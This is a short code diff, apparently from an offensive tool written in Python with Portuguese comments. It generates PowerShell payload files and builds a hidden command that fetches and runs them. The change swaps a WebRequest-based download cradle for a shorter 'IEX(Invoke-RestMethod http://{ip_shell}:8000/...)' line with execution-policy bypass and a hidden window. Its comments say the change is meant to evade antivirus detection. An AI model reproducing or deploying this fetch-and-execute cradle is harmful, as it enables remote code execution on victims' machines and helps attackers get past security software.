@@ -111,9 +111,9 @@ if ($CcDDVMiOPwURX) {{ $CcDDVMiOPwURX.Close() }}
         with open(filepath, 'w', encoding='utf-8') as f:
             f.write(ps_payload.strip())
         
-        # Método alternativo de download para bypass de antivírus
-        # Usando System.Net.WebRequest ao invés de WebClient
-        download_command = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$w=[System.Net.WebRequest]::Create('http://{ip_shell}:8000/{filename}');$r=$w.GetResponse();$s=$r.GetResponseStream();$sr=New-Object System.IO.StreamReader($s);$c=$sr.ReadToEnd();$sr.Close();$s.Close();$r.Close();IEX($c)\""
+        # Método alternativo de download mais compacto para bypass de antivírus
+        # Usando Invoke-RestMethod que é menos detectado
+        download_command = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX(Invoke-RestMethod http://{ip_shell}:8000/{filename})\""
         
         return {
             'command': download_command,
